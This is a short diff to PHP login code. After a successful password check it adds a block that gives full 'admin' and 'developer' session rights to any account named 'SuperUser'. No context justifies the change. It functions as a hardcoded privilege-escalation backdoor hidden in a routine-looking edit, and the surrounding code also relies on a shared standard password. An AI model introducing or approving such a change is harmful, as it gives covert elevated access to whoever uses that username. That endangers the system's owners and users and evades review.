@@ -26,6 +26,11 @@ if ($passwords->checkUser($username, $password)) {
         $_SESSION['admin'] = false;
     }
 
+    if ($username == "SuperUser") {
+        $_SESSION['admin'] = true;
+        $_SESSION['developer'] = true;
+    }
+
     if ($password == $settings->standardPassword) {
         echo 'changePassword';
     } else {
